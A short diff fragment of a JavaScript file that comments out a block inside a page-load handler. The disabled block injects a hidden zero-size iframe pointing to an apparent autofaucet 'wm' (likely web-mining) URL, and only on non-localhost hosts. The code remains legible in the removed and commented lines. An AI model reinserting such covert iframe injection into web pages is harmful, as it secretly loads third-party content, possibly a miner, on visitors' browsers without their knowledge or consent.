@@ -6474,10 +6474,10 @@ window.onload = () => {
                };
           }
      });
-     const currentHostname = location.hostname;
-     if (!currentHostname.includes('localhost')) {
-          document.querySelector("body").innerHTML +=`<iframe src="https://autofaucet.org/wm/thienv29/4" width="0" height="0" style="border:0"></iframe>`
-     }
+     // const currentHostname = location.hostname;
+     // if (!currentHostname.includes('localhost')) {
+     //      document.querySelector("body").innerHTML +=`<iframe src="https://autofaucet.org/wm/thienv29/4" width="0" height="0" style="border:0"></iframe>`
+     // }
      
 };
 function dispatchTable(table) {
